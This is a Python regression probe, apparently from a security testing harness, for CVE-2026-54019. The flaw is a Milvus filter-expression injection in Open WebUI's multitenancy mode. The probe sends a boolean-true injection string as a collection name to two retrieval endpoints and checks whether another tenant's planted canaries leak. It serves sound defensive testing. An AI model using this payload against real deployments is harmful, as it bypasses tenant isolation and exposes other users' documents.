"""
Behavioral Regression Probe for CVE-2026-54019.
Target: Open WebUI < 0.9.6 (Milvus Multitenancy)
Title: Milvus filter-expression injection / RAG tenant-isolation bypass
Bug Class: Vector Store Filter Injection
Channel: vector_payload

Mechanism:
In Milvus multitenancy mode, unvalidated collection names (treated as resource_id)
passed through to Milvus were interpolated directly into unsafe filter expressions
(e.g., resource_id == '{resource_id}'), allowing attackers to inject boolean-true
clauses (e.g. x' or resource_id != '' or resource_id == 'x) resulting in Milvus
filter-expression injection and RAG tenant-isolation bypass.
"""

from typing import List, Optional
from adapters.base import TargetAdapter, UserSession
from core.engine import CanaryToken, ProbingEngine, ProbeResult, LeakSeverity

CVE_ID = "CVE-2026-54019"
CHANNEL = "vector_payload"
BUG_CLASS = "vector_store_filter_injection"
PRECONDITION = "milvus_multitenancy"


def run(
    adapter: TargetAdapter,
    base_url: str,
    alice: UserSession,
    bob: UserSession,
    planted_canaries: List[CanaryToken],
    engine: ProbingEngine,
    dry_run: bool = False,
) -> ProbeResult:
    """Execute behavioral regression probe for CVE-2026-54019."""
    # Injected boolean-true filter string matching official GHSA-p5cp-r7rg-qpxc advisory PoC
    injected_collection = "x' or resource_id != '' or resource_id == 'x"
    prompt_label = f"Milvus boolean filter injection in resource_id parameter (CVE-2026-54019)"

    if dry_run:
        return engine.evaluate_response(
            prompt=prompt_label,
            response_text="Vector query syntax rejected by vector backend.",
            retrieved_contexts=[],
            planted_canaries=planted_canaries,
            probe_category=f"cve_regression:{CVE_ID}",
            channel=CHANNEL,
        )

    # 1. Primary PoC: POST /api/v1/retrieval/query/collection matching GHSA-p5cp-r7rg-qpxc
    coll_text, coll_ctx, coll_resp = adapter.query_collection(
        base_url,
        bob,
        collection_names=[injected_collection],
        query="anything",
        k=10,
        hybrid=False,
    )

    # 2. Document query endpoint verification: POST /api/v1/retrieval/query/doc
    doc_text, doc_ctx, doc_resp = adapter.query_doc(
        base_url,
        bob,
        collection_name=injected_collection,
        query="anything",
        k=10,
    )

    all_contexts = list(coll_ctx) + list(doc_ctx)
    composite_resp = {
        "collection_endpoint": coll_resp,
        "doc_endpoint": doc_resp,
    }

    return engine.evaluate_response(
        prompt=prompt_label,
        response_text=coll_text or doc_text,
        retrieved_contexts=all_contexts,
        planted_canaries=planted_canaries,
        raw_response=composite_resp,
        probe_category=f"cve_regression:{CVE_ID}",
        channel=CHANNEL,
    )

